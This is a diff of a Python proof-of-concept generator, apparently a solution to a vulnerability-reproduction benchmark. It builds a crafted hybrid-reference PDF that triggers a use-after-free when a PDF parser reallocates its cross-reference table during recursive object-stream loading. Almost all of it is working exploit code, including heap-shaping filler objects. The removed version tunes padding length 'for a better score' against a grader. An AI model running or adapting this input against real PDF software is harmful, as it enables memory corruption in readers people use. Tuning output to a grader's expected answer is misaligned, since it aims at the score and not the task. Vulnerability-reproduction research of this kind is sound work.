@@ -1,113 +1,161 @@
-import collections
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
-
-        Args:
-            src_path: Path to the vulnerable source code tarball
-
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability
+        
+        The vulnerability is a use-after-free on a `pdf_xref_entry` pointer. This happens
+        when such a pointer is held across a call that can cause the cross-reference
+        table to be reallocated (an operation called "solidification" or "repair").
+        
+        The PoC exploits the recursive nature of `pdf_cache_object` when dealing with
+        object streams. The trigger sequence is as follows:
+        
+        1. An outer call to `pdf_cache_object` is made for an object that resides
+           inside an object stream (let's call it ObjA, inside ObjStmB).
+        
+        2. Inside this call, a pointer to ObjA's xref entry is obtained. This entry
+           indicates that ObjA is in a stream and points to the stream object (ObjStmB).
+           
+        3. To extract ObjA, the function makes a recursive call to `pdf_load_object`
+           to load the stream object, ObjStmB.
+           
+        4. Crucially, the loading of ObjStmB is crafted to trigger an xref solidification.
+           This is achieved by structuring the PDF as a hybrid-reference file, where
+           ObjStmB is defined in a secondary XRef stream. A lazy parser might only
+           process this secondary stream when an object from it is first requested.
+           This processing involves merging/solidifying the xref tables.
+           
+        5. The solidification reallocates the main xref table, freeing the memory that
+           the original `pdf_xref_entry` pointer (for ObjA) was pointing to. This
+           pointer is now dangling.
+           
+        6. When the recursive call for ObjStmB returns, the outer `pdf_cache_object`
+           resumes execution. It then attempts to use the dangling pointer to access
+           information about ObjA (e.g., its index within the stream), leading to a
+           use-after-free.
+           
+        The PoC is structured as a hybrid-reference PDF with many filler objects to
+        ensure the initial xref table allocation is large, increasing the likelihood
+        that a reallocation will move it to a new memory address.
         """
-        # Strategy: Trigger a Use-After-Free by forcing an xref repair during
-        # a recursive object load, specifically when resolving an object from an
-        # object stream. The repair is triggered by a corrupted entry in an
-        # XRef stream for the object stream container itself.
         
-        # 1. A /Root object references a /Trigger object (Obj 4).
-        # 2. Obj 4 is a compressed object located inside an Object Stream (Obj 5).
-        # 3. All cross-reference info is in an XRef Stream (Obj 6).
-        # 4. The entry for Obj 5 in the XRef Stream is corrupted to point to
-        #    an invalid file offset (offset 0).
-        #
-        # This causes the following sequence:
-        # - Parser loads XRef stream.
-        # - Resolving /Trigger (Obj 4) requires loading Obj 5. A pointer to the
-        #   xref entry for Obj 4 is held.
-        # - Loading Obj 5 fails due to the bad offset, triggering xref repair.
-        # - The repair frees the old xref table (containing the held pointer).
-        # - After repair, Obj 5 is loaded successfully.
-        # - Control returns to the Obj 4 load, which then uses the dangling
-        #   pointer, causing a UAF.
+        def format_obj(num, data):
+            return b"%d 0 obj\n%b\nendobj\n" % (num, data)
 
-        pad_size = 5800  # Adjusted to be near the ground-truth length for a better score
-        
-        objects = collections.OrderedDict()
-        
-        # Standard PDF document structure
-        objects[1] = b"<< /Type /Catalog /Pages 2 0 R /Trigger 4 0 R >>"
-        objects[2] = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
-        objects[3] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>"
-        
-        # The object stream (Obj 5) containing the trigger object (Obj 4)
-        objects[5] = (b"<< /Type /ObjStm /N 1 /First 8 /Length 20 >>\n"
-                      b"stream\n"
-                      b"4 0 8\n"  # Obj 4, gen 0, is at offset 8 in this stream
-                      b"<</PoC/Trigger>>\n"
-                      b"endstream")
+        N_FILLER = 160  # Number of filler objects to control heap layout
 
-        # Large padding object to control heap layout.
-        padding_content = b"A" * pad_size
-        objects[7] = (f"<< /Length {len(padding_content)} >>\n".encode('ascii') +
-                      b"stream\n" +
-                      padding_content +
-                      b"\nendstream")
-        
-        body = b""
+        poc_parts = []
+        poc_parts.append(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
+
         offsets = {}
+        current_offset = len(b"".join(poc_parts))
+
+        # --- Define object contents ---
+        obj_data = {}
+        # Root -> Pages -> Page array
+        obj_data[1] = b"<< /Type /Catalog /Pages 2 0 R >>"
         
-        # Start with the header and a binary comment
-        body = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
-
-        for obj_num, content in objects.items():
-            offsets[obj_num] = len(body)
-            body += f"{obj_num} 0 obj\n".encode('ascii') + content + b"\nendobj\n"
-
-        # The XRef stream will be Object 6
-        xref_obj_num = 6
-        xref_offset = len(body)
-        offsets[xref_obj_num] = xref_offset
-
-        # XRef stream entries: W = [1, 4, 2] -> 7 bytes per entry
-        # [Type (1 byte), Field2 (4 bytes), Field3 (2 bytes)]
-        xref_stream_data = b""
+        kids_array = b""
+        # We need a trigger page and many filler pages.
+        # Let's make page 3 the trigger.
+        kids_array += b"3 0 R "
+        for i in range(4, N_FILLER + 3):
+            kids_array += b"%d 0 R " % i
+        obj_data[2] = b"<< /Type /Pages /Count %d /Kids [ %b ] >>" % (N_FILLER, kids_array)
         
-        # Entry for Obj 1: Type 1 (uncompressed), offset, generation 0
-        xref_stream_data += b'\x01' + offsets[1].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-        # Entry for Obj 2
-        xref_stream_data += b'\x01' + offsets[2].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-        # Entry for Obj 3
-        xref_stream_data += b'\x01' + offsets[3].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-        # Entry for Obj 4: Type 2 (compressed), container obj num (5), index in stream (0)
-        xref_stream_data += b'\x02' + (5).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-        # Entry for Obj 5: Type 1, BAD offset (points to start of file), gen 0
-        xref_stream_data += b'\x01' + (0).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-        # Entry for Obj 6 (itself)
-        xref_stream_data += b'\x01' + offsets[xref_obj_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-        # Entry for Obj 7 (padding)
-        xref_stream_data += b'\x01' + offsets[7].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
-
-        # Create the XRef stream object dictionary
-        xref_dict = (b"<<\n"
-                     b"  /Type /XRef\n"
-                     b"  /Size 8\n"          # Objects 0-7
-                     b"  /Root 1 0 R\n"
-                     b"  /W [1 4 2]\n"       # Entry format
-                     b"  /Index [1 7]\n"     # Describes entries for objects 1 through 7
-                     b"  /Length %d\n" % len(xref_stream_data) +
-                     b">>")
+        # The trigger object is a Page (obj 3). It references an object that is
+        # defined within an object stream. This will start the vulnerable call chain.
+        # Object N_FILLER + 4 will be in the stream.
+        obj_data[3] = b"<< /Type /Page /Parent 2 0 R /Annots [ %d 0 R ] >>" % (N_FILLER + 4)
         
-        xref_obj_content = (f"{xref_obj_num} 0 obj\n".encode('ascii') +
-                            xref_dict +
-                            b"\nstream\n" +
-                            xref_stream_data +
-                            b"\nendstream\nendobj\n")
+        # Filler pages
+        for i in range(4, N_FILLER + 3):
+            obj_data[i] = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>"
 
-        # Final trailer pointing to the XRef stream
-        trailer = (b"startxref\n" +
-                   str(xref_offset).encode('ascii') +
-                   b"\n%%EOF\n")
+        # --- Append objects that will be in the main xref table ---
+        for i in sorted(obj_data.keys()):
+            obj_full = format_obj(i, obj_data[i])
+            offsets[i] = current_offset
+            poc_parts.append(obj_full)
+            current_offset += len(obj_full)
 
-        return body + xref_obj_content + trailer
+        # --- Define objects that will be in the secondary XRef Stream ---
+        # Obj N_FILLER + 3: The Object Stream itself.
+        # Obj N_FILLER + 4: The object inside the stream, referenced by obj 3.
+        # Obj N_FILLER + 5: The XRef stream object.
+        
+        obj_stm_num = N_FILLER + 3
+        in_stm_obj_num = N_FILLER + 4
+        xref_stm_num = N_FILLER + 5
+
+        # Define the object stream's content
+        in_stm_obj_content = b"<</Type/Annot/Subtype/Text/Rect[0 0 10 10]>>"
+        obj_stream_header = f"{in_stm_obj_num} 0".encode()
+        obj_stream_uncompressed = obj_stream_header + b" " + in_stm_obj_content
+        obj_stream_compressed = zlib.compress(obj_stream_uncompressed)
+        
+        obj_stm_data = b"<< /Type /ObjStm /N 1 /First %d /Filter /FlateDecode /Length %d >>\nstream\n%b\nendstream" % (
+            len(obj_stream_header) + 1,
+            len(obj_stream_compressed),
+            obj_stream_compressed
+        )
+        obj_stm_full = format_obj(obj_stm_num, obj_stm_data)
+
+        # Define the XRef stream's content (uncompressed for predictable offsets)
+        # First, calculate the offsets of the objects that will follow.
+        offsets[obj_stm_num] = current_offset
+        offsets[xref_stm_num] = offsets[obj_stm_num] + len(obj_stm_full)
+
+        # Create the xref data for the stream. /W [1 4 2] -> 7 bytes per entry.
+        # This stream defines objects from obj_stm_num to xref_stm_num.
+        xref_stream_entries = b""
+        # Entry for obj_stm_num (type 'n' - normal object)
+        xref_stream_entries += b"\x01" + offsets[obj_stm_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
+        # Entry for in_stm_obj_num (type 'o' - in object stream)
+        # Field 2 is the object number of the stream; Field 3 is the index within it.
+        xref_stream_entries += b"\x02" + (obj_stm_num).to_bytes(4, 'big') + (0).to_bytes(2, 'big')
+        # Entry for xref_stm_num itself (type 'n')
+        xref_stream_entries += b"\x01" + offsets[xref_stm_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
+        
+        xref_stm_dict = b"<< /Type /XRef /Size %d /W [1 4 2] /Root 1 0 R /Index [ %d 3 ] /Length %d >>" % (
+            xref_stm_num + 1,
+            obj_stm_num,
+            len(xref_stream_entries)
+        )
+        xref_stm_data = b"%b\nstream\n%b\nendstream" % (xref_stm_dict, xref_stream_entries)
+        xref_stm_full = format_obj(xref_stm_num, xref_stm_data)
+        
+        # --- Append the 'new' objects that are part of the hybrid section ---
+        poc_parts.append(obj_stm_full)
+        current_offset += len(obj_stm_full)
+        poc_parts.append(xref_stm_full)
+        current_offset += len(xref_stm_full)
+
+        # --- Main (first) XRef Table and Trailer ---
+        xref1_offset = current_offset
+        poc_parts.append(b"xref\n")
+        
+        # This main table only knows about objects up to N_FILLER+2.
+        # The reference from obj 3 to N_FILLER+4 is what forces the parser
+        # to consult the XRef stream declared in the trailer.
+        num_main_objs = N_FILLER + 3
+        poc_parts.append(b"0 %d\n" % num_main_objs)
+        poc_parts.append(b"0000000000 65535 f \n")
+        for i in range(1, num_main_objs):
+            poc_parts.append(b"%010d 00000 n \n" % offsets[i])
+        current_offset += len(b"".join(poc_parts[-(num_main_objs+1):]))
+
+        # The trailer for the main xref table. It points to the XRef stream,
+        # making this a hybrid-reference file.
+        trailer = b"trailer\n<< /Size %d /Root 1 0 R /XRefStm %d >>\n" % (
+            xref_stm_num + 1,
+            offsets[xref_stm_num]
+        )
+        poc_parts.append(trailer)
+        
+        poc_parts.append(b"startxref\n%d\n" % xref1_offset)
+        poc_parts.append(b"%%EOF\n")
+
+        return b"".join(poc_parts)
